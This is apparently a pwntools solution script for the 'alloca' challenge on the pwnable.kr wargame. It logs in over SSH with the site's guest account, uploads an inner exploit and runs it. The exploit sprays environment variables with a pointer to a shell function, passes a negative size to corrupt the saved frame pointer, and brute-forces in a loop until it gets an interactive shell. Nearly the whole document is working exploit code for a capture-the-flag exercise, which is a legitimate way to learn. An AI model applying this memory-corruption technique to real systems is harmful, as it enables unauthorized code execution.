from pwn import *

pwnfile = r"""
from pwn import *

# overwrite $ebp-0x4 with ret.
# bruteforce the program so ret will contain env, which is sprayed with pointers to shell function
ret = "-1792309"
spray = p32(0x80485ab) * 30000
env = {str(a): spray for a in range(12)}

while True:
    sh = process("/home/alloca/alloca", env=env)
    sh.sendline('-80')
    sh.sendline(ret)
    sh.interactive()
"""

con = ssh("alloca", "pwnable.kr", 2222, "guest")
con.run("mkdir /tmp/leo6")
con.upload_data(pwnfile, "/tmp/leo6/pwnfile.py")
# run pwnfile.py at remote, you will get flag!

# sorry... I stand corrected.. it is H4RD to make secure software
